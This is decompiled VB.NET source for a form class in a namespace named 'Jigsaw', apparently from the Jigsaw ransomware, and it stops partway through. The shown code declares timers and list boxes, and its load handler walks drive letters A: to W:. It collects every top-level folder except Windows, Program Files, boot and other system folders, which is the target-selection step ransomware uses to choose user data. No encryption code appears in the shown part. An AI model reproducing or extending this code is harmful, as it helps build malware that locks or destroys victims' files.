Imports System
Imports System.Collections.Generic
Imports System.ComponentModel
Imports System.Diagnostics
Imports System.Drawing
Imports System.Runtime.CompilerServices
Imports System.Windows.Forms
Imports Jigsaw.My
Imports Microsoft.VisualBasic
Imports Microsoft.VisualBasic.CompilerServices

Namespace Jigsaw
	' Token: 0x0200000A RID: 10
	<DesignerGenerated()>
	Public Partial Class Form3
		Inherits Form

		' Token: 0x06000087 RID: 135 RVA: 0x00002392 File Offset: 0x00000592
		Public Sub New()
			AddHandler MyBase.Load, AddressOf Me.Form3_Load
			Me.InitializeComponent()
		End Sub

		' Token: 0x17000036 RID: 54
		' (get) Token: 0x0600008A RID: 138 RVA: 0x000023B2 File Offset: 0x000005B2
		' (set) Token: 0x0600008B RID: 139 RVA: 0x000023BA File Offset: 0x000005BA
		Friend Overridable Property Label3 As Label

		' Token: 0x17000037 RID: 55
		' (get) Token: 0x0600008C RID: 140 RVA: 0x000023C3 File Offset: 0x000005C3
		' (set) Token: 0x0600008D RID: 141 RVA: 0x000023CB File Offset: 0x000005CB
		Friend Overridable Property Label2 As Label

		' Token: 0x17000038 RID: 56
		' (get) Token: 0x0600008E RID: 142 RVA: 0x000023D4 File Offset: 0x000005D4
		' (set) Token: 0x0600008F RID: 143 RVA: 0x000023DC File Offset: 0x000005DC
		Friend Overridable Property Label1 As Label

		' Token: 0x17000039 RID: 57
		' (get) Token: 0x06000090 RID: 144 RVA: 0x000023E5 File Offset: 0x000005E5
		' (set) Token: 0x06000091 RID: 145 RVA: 0x000023ED File Offset: 0x000005ED
		Friend Overridable Property ProgressBar5 As ProgressBar

		' Token: 0x1700003A RID: 58
		' (get) Token: 0x06000092 RID: 146 RVA: 0x000023F6 File Offset: 0x000005F6
		' (set) Token: 0x06000093 RID: 147 RVA: 0x000023FE File Offset: 0x000005FE
		Friend Overridable Property ProgressBar4 As ProgressBar

		' Token: 0x1700003B RID: 59
		' (get) Token: 0x06000094 RID: 148 RVA: 0x00002407 File Offset: 0x00000607
		' (set) Token: 0x06000095 RID: 149 RVA: 0x00008480 File Offset: 0x00006680
		Friend Overridable Property Timer7 As Timer
			<CompilerGenerated()>
			Get
				Return Me._Timer7
			End Get
			<CompilerGenerated()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As Timer)
				Dim eventHandler As EventHandler = AddressOf Me.Timer7_Tick
				Dim timer As Timer = Me._Timer7
				If timer IsNot Nothing Then
					RemoveHandler timer.Tick, eventHandler
				End If
				Me._Timer7 = value
				timer = Me._Timer7
				If timer IsNot Nothing Then
					AddHandler timer.Tick, eventHandler
				End If
			End Set
		End Property

		' Token: 0x1700003C RID: 60
		' (get) Token: 0x06000096 RID: 150 RVA: 0x0000240F File Offset: 0x0000060F
		' (set) Token: 0x06000097 RID: 151 RVA: 0x00002417 File Offset: 0x00000617
		Friend Overridable Property ProgressBar9 As ProgressBar

		' Token: 0x1700003D RID: 61
		' (get) Token: 0x06000098 RID: 152 RVA: 0x00002420 File Offset: 0x00000620
		' (set) Token: 0x06000099 RID: 153 RVA: 0x00002428 File Offset: 0x00000628
		Friend Overridable Property ProgressBar7 As ProgressBar

		' Token: 0x1700003E RID: 62
		' (get) Token: 0x0600009A RID: 154 RVA: 0x00002431 File Offset: 0x00000631
		' (set) Token: 0x0600009B RID: 155 RVA: 0x00002439 File Offset: 0x00000639
		Friend Overridable Property ProgressBar6 As ProgressBar

		' Token: 0x1700003F RID: 63
		' (get) Token: 0x0600009C RID: 156 RVA: 0x00002442 File Offset: 0x00000642
		' (set) Token: 0x0600009D RID: 157 RVA: 0x0000244A File Offset: 0x0000064A
		Friend Overridable Property ProgressBar3 As ProgressBar

		' Token: 0x17000040 RID: 64
		' (get) Token: 0x0600009E RID: 158 RVA: 0x00002453 File Offset: 0x00000653
		' (set) Token: 0x0600009F RID: 159 RVA: 0x000084C4 File Offset: 0x000066C4
		Friend Overridable Property Timer8 As Timer
			<CompilerGenerated()>
			Get
				Return Me._Timer8
			End Get
			<CompilerGenerated()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As Timer)
				Dim eventHandler As EventHandler = AddressOf Me.Timer8_Tick
				Dim timer As Timer = Me._Timer8
				If timer IsNot Nothing Then
					RemoveHandler timer.Tick, eventHandler
				End If
				Me._Timer8 = value
				timer = Me._Timer8
				If timer IsNot Nothing Then
					AddHandler timer.Tick, eventHandler
				End If
			End Set
		End Property

		' Token: 0x17000041 RID: 65
		' (get) Token: 0x060000A0 RID: 160 RVA: 0x0000245B File Offset: 0x0000065B
		' (set) Token: 0x060000A1 RID: 161 RVA: 0x00008508 File Offset: 0x00006708
		Friend Overridable Property Timer6 As Timer
			<CompilerGenerated()>
			Get
				Return Me._Timer6
			End Get
			<CompilerGenerated()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As Timer)
				Dim eventHandler As EventHandler = AddressOf Me.Timer6_Tick
				Dim timer As Timer = Me._Timer6
				If timer IsNot Nothing Then
					RemoveHandler timer.Tick, eventHandler
				End If
				Me._Timer6 = value
				timer = Me._Timer6
				If timer IsNot Nothing Then
					AddHandler timer.Tick, eventHandler
				End If
			End Set
		End Property

		' Token: 0x17000042 RID: 66
		' (get) Token: 0x060000A2 RID: 162 RVA: 0x00002463 File Offset: 0x00000663
		' (set) Token: 0x060000A3 RID: 163 RVA: 0x0000854C File Offset: 0x0000674C
		Friend Overridable Property Timer1 As Timer
			<CompilerGenerated()>
			Get
				Return Me._Timer1
			End Get
			<CompilerGenerated()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As Timer)
				Dim eventHandler As EventHandler = AddressOf Me.Timer1_Tick
				Dim timer As Timer = Me._Timer1
				If timer IsNot Nothing Then
					RemoveHandler timer.Tick, eventHandler
				End If
				Me._Timer1 = value
				timer = Me._Timer1
				If timer IsNot Nothing Then
					AddHandler timer.Tick, eventHandler
				End If
			End Set
		End Property

		' Token: 0x17000043 RID: 67
		' (get) Token: 0x060000A4 RID: 164 RVA: 0x0000246B File Offset: 0x0000066B
		' (set) Token: 0x060000A5 RID: 165 RVA: 0x00002473 File Offset: 0x00000673
		Friend Overridable Property ProgressBar2 As ProgressBar

		' Token: 0x17000044 RID: 68
		' (get) Token: 0x060000A6 RID: 166 RVA: 0x0000247C File Offset: 0x0000067C
		' (set) Token: 0x060000A7 RID: 167 RVA: 0x00002484 File Offset: 0x00000684
		Friend Overridable Property ProgressBar1 As ProgressBar

		' Token: 0x17000045 RID: 69
		' (get) Token: 0x060000A8 RID: 168 RVA: 0x0000248D File Offset: 0x0000068D
		' (set) Token: 0x060000A9 RID: 169 RVA: 0x00002495 File Offset: 0x00000695
		Friend Overridable Property ListBox9 As ListBox

		' Token: 0x17000046 RID: 70
		' (get) Token: 0x060000AA RID: 170 RVA: 0x0000249E File Offset: 0x0000069E
		' (set) Token: 0x060000AB RID: 171 RVA: 0x000024A6 File Offset: 0x000006A6
		Friend Overridable Property ListBox8 As ListBox

		' Token: 0x17000047 RID: 71
		' (get) Token: 0x060000AC RID: 172 RVA: 0x000024AF File Offset: 0x000006AF
		' (set) Token: 0x060000AD RID: 173 RVA: 0x000024B7 File Offset: 0x000006B7
		Friend Overridable Property ListBox7 As ListBox

		' Token: 0x17000048 RID: 72
		' (get) Token: 0x060000AE RID: 174 RVA: 0x000024C0 File Offset: 0x000006C0
		' (set) Token: 0x060000AF RID: 175 RVA: 0x00008590 File Offset: 0x00006790
		Friend Overridable Property Timer4 As Timer
			<CompilerGenerated()>
			Get
				Return Me._Timer4
			End Get
			<CompilerGenerated()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As Timer)
				Dim eventHandler As EventHandler = AddressOf Me.Timer4_Tick
				Dim timer As Timer = Me._Timer4
				If timer IsNot Nothing Then
					RemoveHandler timer.Tick, eventHandler
				End If
				Me._Timer4 = value
				timer = Me._Timer4
				If timer IsNot Nothing Then
					AddHandler timer.Tick, eventHandler
				End If
			End Set
		End Property

		' Token: 0x17000049 RID: 73
		' (get) Token: 0x060000B0 RID: 176 RVA: 0x000024C8 File Offset: 0x000006C8
		' (set) Token: 0x060000B1 RID: 177 RVA: 0x000024D0 File Offset: 0x000006D0
		Friend Overridable Property ListBox6 As ListBox

		' Token: 0x1700004A RID: 74
		' (get) Token: 0x060000B2 RID: 178 RVA: 0x000024D9 File Offset: 0x000006D9
		' (set) Token: 0x060000B3 RID: 179 RVA: 0x000024E1 File Offset: 0x000006E1
		Friend Overridable Property ListBox5 As ListBox

		' Token: 0x1700004B RID: 75
		' (get) Token: 0x060000B4 RID: 180 RVA: 0x000024EA File Offset: 0x000006EA
		' (set) Token: 0x060000B5 RID: 181 RVA: 0x000024F2 File Offset: 0x000006F2
		Friend Overridable Property ListBox4 As ListBox

		' Token: 0x1700004C RID: 76
		' (get) Token: 0x060000B6 RID: 182 RVA: 0x000024FB File Offset: 0x000006FB
		' (set) Token: 0x060000B7 RID: 183 RVA: 0x00002503 File Offset: 0x00000703
		Friend Overridable Property ListBox3 As ListBox

		' Token: 0x1700004D RID: 77
		' (get) Token: 0x060000B8 RID: 184 RVA: 0x0000250C File Offset: 0x0000070C
		' (set) Token: 0x060000B9 RID: 185 RVA: 0x00002514 File Offset: 0x00000714
		Friend Overridable Property ListBox2 As ListBox

		' Token: 0x1700004E RID: 78
		' (get) Token: 0x060000BA RID: 186 RVA: 0x0000251D File Offset: 0x0000071D
		' (set) Token: 0x060000BB RID: 187 RVA: 0x00002525 File Offset: 0x00000725
		Friend Overridable Property ListBox1 As ListBox

		' Token: 0x1700004F RID: 79
		' (get) Token: 0x060000BC RID: 188 RVA: 0x0000252E File Offset: 0x0000072E
		' (set) Token: 0x060000BD RID: 189 RVA: 0x000085D4 File Offset: 0x000067D4
		Friend Overridable Property Timer3 As Timer
			<CompilerGenerated()>
			Get
				Return Me._Timer3
			End Get
			<CompilerGenerated()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As Timer)
				Dim eventHandler As EventHandler = AddressOf Me.Timer3_Tick
				Dim timer As Timer = Me._Timer3
				If timer IsNot Nothing Then
					RemoveHandler timer.Tick, eventHandler
				End If
				Me._Timer3 = value
				timer = Me._Timer3
				If timer IsNot Nothing Then
					AddHandler timer.Tick, eventHandler
				End If
			End Set
		End Property

		' Token: 0x17000050 RID: 80
		' (get) Token: 0x060000BE RID: 190 RVA: 0x00002536 File Offset: 0x00000736
		' (set) Token: 0x060000BF RID: 191 RVA: 0x00008618 File Offset: 0x00006818
		Friend Overridable Property Timer5 As Timer
			<CompilerGenerated()>
			Get
				Return Me._Timer5
			End Get
			<CompilerGenerated()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As Timer)
				Dim eventHandler As EventHandler = AddressOf Me.Timer5_Tick
				Dim timer As Timer = Me._Timer5
				If timer IsNot Nothing Then
					RemoveHandler timer.Tick, eventHandler
				End If
				Me._Timer5 = value
				timer = Me._Timer5
				If timer IsNot Nothing Then
					AddHandler timer.Tick, eventHandler
				End If
			End Set
		End Property

		' Token: 0x17000051 RID: 81
		' (get) Token: 0x060000C0 RID: 192 RVA: 0x0000253E File Offset: 0x0000073E
		' (set) Token: 0x060000C1 RID: 193 RVA: 0x0000865C File Offset: 0x0000685C
		Friend Overridable Property Timer2 As Timer
			<CompilerGenerated()>
			Get
				Return Me._Timer2
			End Get
			<CompilerGenerated()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As Timer)
				Dim eventHandler As EventHandler = AddressOf Me.Timer2_Tick
				Dim timer As Timer = Me._Timer2
				If timer IsNot Nothing Then
					RemoveHandler timer.Tick, eventHandler
				End If
				Me._Timer2 = value
				timer = Me._Timer2
				If timer IsNot Nothing Then
					AddHandler timer.Tick, eventHandler
				End If
			End Set
		End Property

		' Token: 0x060000C2 RID: 194 RVA: 0x000086A0 File Offset: 0x000068A0
		Private Sub Form3_Load(sender As Object, e As EventArgs)
			Try
				Try
					For Each text As String In MyProject.Computer.FileSystem.GetDirectories("A:\")
						If Not text.EndsWith("Bin") AndAlso Not text.EndsWith("indows") AndAlso Not text.EndsWith("tings") AndAlso Not text.EndsWith("System Volume Information") AndAlso Not text.EndsWith("cache") AndAlso Not text.EndsWith("very") AndAlso Not text.EndsWith("rogram Files (x86)") AndAlso Not text.EndsWith("rogram Files") AndAlso Not text.EndsWith("boot") AndAlso Not text.EndsWith("efi") AndAlso Not text.EndsWith(".old") Then
							Me.ListBox1.Items.Add(text)
							Me.ListBox9.Items.Add(text)
						End If
					Next
				Finally
					Dim enumerator As IEnumerator(Of String)
					If enumerator IsNot Nothing Then
						enumerator.Dispose()
					End If
				End Try
			Catch ex As Exception
			End Try
			Try
				Try
					For Each text2 As String In MyProject.Computer.FileSystem.GetDirectories("B:\")
						If Not text2.EndsWith("Bin") AndAlso Not text2.EndsWith("indows") AndAlso Not text2.EndsWith("tings") AndAlso Not text2.EndsWith("System Volume Information") AndAlso Not text2.EndsWith("cache") AndAlso Not text2.EndsWith("very") AndAlso Not text2.EndsWith("rogram Files (x86)") AndAlso Not text2.EndsWith("rogram Files") AndAlso Not text2.EndsWith("boot") AndAlso Not text2.EndsWith("efi") AndAlso Not text2.EndsWith(".old") Then
							Me.ListBox1.Items.Add(text2)
							Me.ListBox9.Items.Add(text2)
						End If
					Next
				Finally
					Dim enumerator2 As IEnumerator(Of String)
					If enumerator2 IsNot Nothing Then
						enumerator2.Dispose()
					End If
				End Try
			Catch ex2 As Exception
			End Try
			Try
				Try
					For Each text3 As String In MyProject.Computer.FileSystem.GetDirectories("C:\")
						If Not text3.EndsWith("Bin") AndAlso Not text3.EndsWith("indows") AndAlso Not text3.EndsWith("tings") AndAlso Not text3.EndsWith("System Volume Information") AndAlso Not text3.EndsWith("cache") AndAlso Not text3.EndsWith("very") AndAlso Not text3.EndsWith("rogram Files (x86)") AndAlso Not text3.EndsWith("rogram Files") AndAlso Not text3.EndsWith("boot") AndAlso Not text3.EndsWith("efi") AndAlso Not text3.EndsWith(".old") Then
							Me.ListBox1.Items.Add(text3)
							Me.ListBox9.Items.Add(text3)
						End If
					Next
				Finally
					Dim enumerator3 As IEnumerator(Of String)
					If enumerator3 IsNot Nothing Then
						enumerator3.Dispose()
					End If
				End Try
			Catch ex3 As Exception
			End Try
			Try
				Try
					For Each text4 As String In MyProject.Computer.FileSystem.GetDirectories("D:\")
						If Not text4.EndsWith("Bin") AndAlso Not text4.EndsWith("indows") AndAlso Not text4.EndsWith("tings") AndAlso Not text4.EndsWith("System Volume Information") AndAlso Not text4.EndsWith("cache") AndAlso Not text4.EndsWith("very") AndAlso Not text4.EndsWith("rogram Files (x86)") AndAlso Not text4.EndsWith("rogram Files") AndAlso Not text4.EndsWith("boot") AndAlso Not text4.EndsWith("efi") AndAlso Not text4.EndsWith(".old") Then
							Me.ListBox1.Items.Add(text4)
							Me.ListBox9.Items.Add(text4)
						End If
					Next
				Finally
					Dim enumerator4 As IEnumerator(Of String)
					If enumerator4 IsNot Nothing Then
						enumerator4.Dispose()
					End If
				End Try
			Catch ex4 As Exception
			End Try
			Try
				Try
					For Each text5 As String In MyProject.Computer.FileSystem.GetDirectories("E:\")
						If Not text5.EndsWith("Bin") AndAlso Not text5.EndsWith("indows") AndAlso Not text5.EndsWith("tings") AndAlso Not text5.EndsWith("System Volume Information") AndAlso Not text5.EndsWith("cache") AndAlso Not text5.EndsWith("very") AndAlso Not text5.EndsWith("rogram Files (x86)") AndAlso Not text5.EndsWith("rogram Files") AndAlso Not text5.EndsWith("boot") AndAlso Not text5.EndsWith("efi") AndAlso Not text5.EndsWith(".old") Then
							Me.ListBox1.Items.Add(text5)
							Me.ListBox9.Items.Add(text5)
						End If
					Next
				Finally
					Dim enumerator5 As IEnumerator(Of String)
					If enumerator5 IsNot Nothing Then
						enumerator5.Dispose()
					End If
				End Try
			Catch ex5 As Exception
			End Try
			Try
				Try
					For Each text6 As String In MyProject.Computer.FileSystem.GetDirectories("F:\")
						If Not text6.EndsWith("Bin") AndAlso Not text6.EndsWith("indows") AndAlso Not text6.EndsWith("tings") AndAlso Not text6.EndsWith("System Volume Information") AndAlso Not text6.EndsWith("cache") AndAlso Not text6.EndsWith("very") AndAlso Not text6.EndsWith("rogram Files (x86)") AndAlso Not text6.EndsWith("rogram Files") AndAlso Not text6.EndsWith("boot") AndAlso Not text6.EndsWith("efi") AndAlso Not text6.EndsWith(".old") Then
							Me.ListBox1.Items.Add(text6)
							Me.ListBox9.Items.Add(text6)
						End If
					Next
				Finally
					Dim enumerator6 As IEnumerator(Of String)
					If enumerator6 IsNot Nothing Then
						enumerator6.Dispose()
					End If
				End Try
			Catch ex6 As Exception
			End Try
			Try
				Try
					For Each text7 As String In MyProject.Computer.FileSystem.GetDirectories("G:\")
						If Not text7.EndsWith("Bin") AndAlso Not text7.EndsWith("indows") AndAlso Not text7.EndsWith("tings") AndAlso Not text7.EndsWith("System Volume Information") AndAlso Not text7.EndsWith("cache") AndAlso Not text7.EndsWith("very") AndAlso Not text7.EndsWith("rogram Files (x86)") AndAlso Not text7.EndsWith("rogram Files") AndAlso Not text7.EndsWith("boot") AndAlso Not text7.EndsWith("efi") AndAlso Not text7.EndsWith(".old") Then
							Me.ListBox1.Items.Add(text7)
							Me.ListBox9.Items.Add(text7)
						End If
					Next
				Finally
					Dim enumerator7 As IEnumerator(Of String)
					If enumerator7 IsNot Nothing Then
						enumerator7.Dispose()
					End If
				End Try
			Catch ex7 As Exception
			End Try
			Try
				Try
					For Each text8 As String In MyProject.Computer.FileSystem.GetDirectories("H:\")
						If Not text8.EndsWith("Bin") AndAlso Not text8.EndsWith("indows") AndAlso Not text8.EndsWith("tings") AndAlso Not text8.EndsWith("System Volume Information") AndAlso Not text8.EndsWith("cache") AndAlso Not text8.EndsWith("very") AndAlso Not text8.EndsWith("rogram Files (x86)") AndAlso Not text8.EndsWith("rogram Files") AndAlso Not text8.EndsWith("boot") AndAlso Not text8.EndsWith("efi") AndAlso Not text8.EndsWith(".old") Then
							Me.ListBox1.Items.Add(text8)
							Me.ListBox9.Items.Add(text8)
						End If
					Next
				Finally
					Dim enumerator8 As IEnumerator(Of String)
					If enumerator8 IsNot Nothing Then
						enumerator8.Dispose()
					End If
				End Try
			Catch ex8 As Exception
			End Try
			Try
				Try
					For Each text9 As String In MyProject.Computer.FileSystem.GetDirectories("I:\")
						If Not text9.EndsWith("Bin") AndAlso Not text9.EndsWith("indows") AndAlso Not text9.EndsWith("tings") AndAlso Not text9.EndsWith("System Volume Information") AndAlso Not text9.EndsWith("cache") AndAlso Not text9.EndsWith("very") AndAlso Not text9.EndsWith("rogram Files (x86)") AndAlso Not text9.EndsWith("rogram Files") AndAlso Not text9.EndsWith("boot") AndAlso Not text9.EndsWith("efi") AndAlso Not text9.EndsWith(".old") Then
							Me.ListBox1.Items.Add(text9)
							Me.ListBox9.Items.Add(text9)
						End If
					Next
				Finally
					Dim enumerator9 As IEnumerator(Of String)
					If enumerator9 IsNot Nothing Then
						enumerator9.Dispose()
					End If
				End Try
			Catch ex9 As Exception
			End Try
			Try
				Try
					For Each text10 As String In MyProject.Computer.FileSystem.GetDirectories("J:\")
						If Not text10.EndsWith("Bin") AndAlso Not text10.EndsWith("indows") AndAlso Not text10.EndsWith("tings") AndAlso Not text10.EndsWith("System Volume Information") AndAlso Not text10.EndsWith("cache") AndAlso Not text10.EndsWith("very") AndAlso Not text10.EndsWith("rogram Files (x86)") AndAlso Not text10.EndsWith("rogram Files") AndAlso Not text10.EndsWith("boot") AndAlso Not text10.EndsWith("efi") AndAlso Not text10.EndsWith(".old") Then
							Me.ListBox1.Items.Add(text10)
							Me.ListBox9.Items.Add(text10)
						End If
					Next
				Finally
					Dim enumerator10 As IEnumerator(Of String)
					If enumerator10 IsNot Nothing Then
						enumerator10.Dispose()
					End If
				End Try
			Catch ex10 As Exception
			End Try
			Try
				Try
					For Each text11 As String In MyProject.Computer.FileSystem.GetDirectories("K:\")
						If Not text11.EndsWith("Bin") AndAlso Not text11.EndsWith("indows") AndAlso Not text11.EndsWith("tings") AndAlso Not text11.EndsWith("System Volume Information") AndAlso Not text11.EndsWith("cache") AndAlso Not text11.EndsWith("very") AndAlso Not text11.EndsWith("rogram Files (x86)") AndAlso Not text11.EndsWith("rogram Files") AndAlso Not text11.EndsWith("boot") AndAlso Not text11.EndsWith("efi") AndAlso Not text11.EndsWith(".old") Then
							Me.ListBox1.Items.Add(text11)
							Me.ListBox9.Items.Add(text11)
						End If
					Next
				Finally
					Dim enumerator11 As IEnumerator(Of String)
					If enumerator11 IsNot Nothing Then
						enumerator11.Dispose()
					End If
				End Try
			Catch ex11 As Exception
			End Try
			Try
				Try
					For Each text12 As String In MyProject.Computer.FileSystem.GetDirectories("L:\")
						If Not text12.EndsWith("Bin") AndAlso Not text12.EndsWith("indows") AndAlso Not text12.EndsWith("tings") AndAlso Not text12.EndsWith("System Volume Information") AndAlso Not text12.EndsWith("cache") AndAlso Not text12.EndsWith("very") AndAlso Not text12.EndsWith("rogram Files (x86)") AndAlso Not text12.EndsWith("rogram Files") AndAlso Not text12.EndsWith("boot") AndAlso Not text12.EndsWith("efi") AndAlso Not text12.EndsWith(".old") Then
							Me.ListBox1.Items.Add(text12)
							Me.ListBox9.Items.Add(text12)
						End If
					Next
				Finally
					Dim enumerator12 As IEnumerator(Of String)
					If enumerator12 IsNot Nothing Then
						enumerator12.Dispose()
					End If
				End Try
			Catch ex12 As Exception
			End Try
			Try
				Try
					For Each text13 As String In MyProject.Computer.FileSystem.GetDirectories("M:\")
						If Not text13.EndsWith("Bin") AndAlso Not text13.EndsWith("indows") AndAlso Not text13.EndsWith("tings") AndAlso Not text13.EndsWith("System Volume Information") AndAlso Not text13.EndsWith("cache") AndAlso Not text13.EndsWith("very") AndAlso Not text13.EndsWith("rogram Files (x86)") AndAlso Not text13.EndsWith("rogram Files") AndAlso Not text13.EndsWith("boot") AndAlso Not text13.EndsWith("efi") AndAlso Not text13.EndsWith(".old") Then
							Me.ListBox1.Items.Add(text13)
							Me.ListBox9.Items.Add(text13)
						End If
					Next
				Finally
					Dim enumerator13 As IEnumerator(Of String)
					If enumerator13 IsNot Nothing Then
						enumerator13.Dispose()
					End If
				End Try
			Catch ex13 As Exception
			End Try
			Try
				Try
					For Each text14 As String In MyProject.Computer.FileSystem.GetDirectories("N:\")
						If Not text14.EndsWith("Bin") AndAlso Not text14.EndsWith("indows") AndAlso Not text14.EndsWith("tings") AndAlso Not text14.EndsWith("System Volume Information") AndAlso Not text14.EndsWith("cache") AndAlso Not text14.EndsWith("very") AndAlso Not text14.EndsWith("rogram Files (x86)") AndAlso Not text14.EndsWith("rogram Files") AndAlso Not text14.EndsWith("boot") AndAlso Not text14.EndsWith("efi") AndAlso Not text14.EndsWith(".old") Then
							Me.ListBox1.Items.Add(text14)
							Me.ListBox9.Items.Add(text14)
						End If
					Next
				Finally
					Dim enumerator14 As IEnumerator(Of String)
					If enumerator14 IsNot Nothing Then
						enumerator14.Dispose()
					End If
				End Try
			Catch ex14 As Exception
			End Try
			Try
				Try
					For Each text15 As String In MyProject.Computer.FileSystem.GetDirectories("O:\")
						If Not text15.EndsWith("Bin") AndAlso Not text15.EndsWith("indows") AndAlso Not text15.EndsWith("tings") AndAlso Not text15.EndsWith("System Volume Information") AndAlso Not text15.EndsWith("cache") AndAlso Not text15.EndsWith("very") AndAlso Not text15.EndsWith("rogram Files (x86)") AndAlso Not text15.EndsWith("rogram Files") AndAlso Not text15.EndsWith("boot") AndAlso Not text15.EndsWith("efi") AndAlso Not text15.EndsWith(".old") Then
							Me.ListBox1.Items.Add(text15)
							Me.ListBox9.Items.Add(text15)
						End If
					Next
				Finally
					Dim enumerator15 As IEnumerator(Of String)
					If enumerator15 IsNot Nothing Then
						enumerator15.Dispose()
					End If
				End Try
			Catch ex15 As Exception
			End Try
			Try
				Try
					For Each text16 As String In MyProject.Computer.FileSystem.GetDirectories("P:\")
						If Not text16.EndsWith("Bin") AndAlso Not text16.EndsWith("indows") AndAlso Not text16.EndsWith("tings") AndAlso Not text16.EndsWith("System Volume Information") AndAlso Not text16.EndsWith("cache") AndAlso Not text16.EndsWith("very") AndAlso Not text16.EndsWith("rogram Files (x86)") AndAlso Not text16.EndsWith("rogram Files") AndAlso Not text16.EndsWith("boot") AndAlso Not text16.EndsWith("efi") AndAlso Not text16.EndsWith(".old") Then
							Me.ListBox1.Items.Add(text16)
							Me.ListBox9.Items.Add(text16)
						End If
					Next
				Finally
					Dim enumerator16 As IEnumerator(Of String)
					If enumerator16 IsNot Nothing Then
						enumerator16.Dispose()
					End If
				End Try
			Catch ex16 As Exception
			End Try
			Try
				Try
					For Each text17 As String In MyProject.Computer.FileSystem.GetDirectories("Q:\")
						If Not text17.EndsWith("Bin") AndAlso Not text17.EndsWith("indows") AndAlso Not text17.EndsWith("tings") AndAlso Not text17.EndsWith("System Volume Information") AndAlso Not text17.EndsWith("cache") AndAlso Not text17.EndsWith("very") AndAlso Not text17.EndsWith("rogram Files (x86)") AndAlso Not text17.EndsWith("rogram Files") AndAlso Not text17.EndsWith("boot") AndAlso Not text17.EndsWith("efi") AndAlso Not text17.EndsWith(".old") Then
							Me.ListBox1.Items.Add(text17)
							Me.ListBox9.Items.Add(text17)
						End If
					Next
				Finally
					Dim enumerator17 As IEnumerator(Of String)
					If enumerator17 IsNot Nothing Then
						enumerator17.Dispose()
					End If
				End Try
			Catch ex17 As Exception
			End Try
			Try
				Try
					For Each text18 As String In MyProject.Computer.FileSystem.GetDirectories("R:\")
						If Not text18.EndsWith("Bin") AndAlso Not text18.EndsWith("indows") AndAlso Not text18.EndsWith("tings") AndAlso Not text18.EndsWith("System Volume Information") AndAlso Not text18.EndsWith("cache") AndAlso Not text18.EndsWith("very") AndAlso Not text18.EndsWith("rogram Files (x86)") AndAlso Not text18.EndsWith("rogram Files") AndAlso Not text18.EndsWith("boot") AndAlso Not text18.EndsWith("efi") AndAlso Not text18.EndsWith(".old") Then
							Me.ListBox1.Items.Add(text18)
							Me.ListBox9.Items.Add(text18)
						End If
					Next
				Finally
					Dim enumerator18 As IEnumerator(Of String)
					If enumerator18 IsNot Nothing Then
						enumerator18.Dispose()
					End If
				End Try
			Catch ex18 As Exception
			End Try
			Try
				Try
					For Each text19 As String In MyProject.Computer.FileSystem.GetDirectories("S:\")
						If Not text19.EndsWith("Bin") AndAlso Not text19.EndsWith("indows") AndAlso Not text19.EndsWith("tings") AndAlso Not text19.EndsWith("System Volume Information") AndAlso Not text19.EndsWith("cache") AndAlso Not text19.EndsWith("very") AndAlso Not text19.EndsWith("rogram Files (x86)") AndAlso Not text19.EndsWith("rogram Files") AndAlso Not text19.EndsWith("boot") AndAlso Not text19.EndsWith("efi") AndAlso Not text19.EndsWith(".old") Then
							Me.ListBox1.Items.Add(text19)
							Me.ListBox9.Items.Add(text19)
						End If
					Next
				Finally
					Dim enumerator19 As IEnumerator(Of String)
					If enumerator19 IsNot Nothing Then
						enumerator19.Dispose()
					End If
				End Try
			Catch ex19 As Exception
			End Try
			Try
				Try
					For Each text20 As String In MyProject.Computer.FileSystem.GetDirectories("T:\")
						If Not text20.EndsWith("Bin") AndAlso Not text20.EndsWith("indows") AndAlso Not text20.EndsWith("tings") AndAlso Not text20.EndsWith("System Volume Information") AndAlso Not text20.EndsWith("cache") AndAlso Not text20.EndsWith("very") AndAlso Not text20.EndsWith("rogram Files (x86)") AndAlso Not text20.EndsWith("rogram Files") AndAlso Not text20.EndsWith("boot") AndAlso Not text20.EndsWith("efi") AndAlso Not text20.EndsWith(".old") Then
							Me.ListBox1.Items.Add(text20)
							Me.ListBox9.Items.Add(text20)
						End If
					Next
				Finally
					Dim enumerator20 As IEnumerator(Of String)
					If enumerator20 IsNot Nothing Then
						enumerator20.Dispose()
					End If
				End Try
			Catch ex20 As Exception
			End Try
			Try
				Try
					For Each text21 As String In MyProject.Computer.FileSystem.GetDirectories("U:\")
						If Not text21.EndsWith("Bin") AndAlso Not text21.EndsWith("indows") AndAlso Not text21.EndsWith("tings") AndAlso Not text21.EndsWith("System Volume Information") AndAlso Not text21.EndsWith("cache") AndAlso Not text21.EndsWith("very") AndAlso Not text21.EndsWith("rogram Files (x86)") AndAlso Not text21.EndsWith("rogram Files") AndAlso Not text21.EndsWith("boot") AndAlso Not text21.EndsWith("efi") AndAlso Not text21.EndsWith(".old") Then
							Me.ListBox1.Items.Add(text21)
							Me.ListBox9.Items.Add(text21)
						End If
					Next
				Finally
					Dim enumerator21 As IEnumerator(Of String)
					If enumerator21 IsNot Nothing Then
						enumerator21.Dispose()
					End If
				End Try
			Catch ex21 As Exception
			End Try
			Try
				Try
					For Each text22 As String In MyProject.Computer.FileSystem.GetDirectories("V:\")
						If Not text22.EndsWith("Bin") AndAlso Not text22.EndsWith("indows") AndAlso Not text22.EndsWith("tings") AndAlso Not text22.EndsWith("System Volume Information") AndAlso Not text22.EndsWith("cache") AndAlso Not text22.EndsWith("very") AndAlso Not text22.EndsWith("rogram Files (x86)") AndAlso Not text22.EndsWith("rogram Files") AndAlso Not text22.EndsWith("boot") AndAlso Not text22.EndsWith("efi") AndAlso Not text22.EndsWith(".old") Then
							Me.ListBox1.Items.Add(text22)
							Me.ListBox9.Items.Add(text22)
						End If
					Next
				Finally
					Dim enumerator22 As IEnumerator(Of String)
					If enumerator22 IsNot Nothing Then
						enumerator22.Dispose()
					End If
				End Try
			Catch ex22 As Exception
			End Try
			Try
				Try
					For Each text23 As String In MyProject.Computer.FileSystem.GetDirectories("W:\")
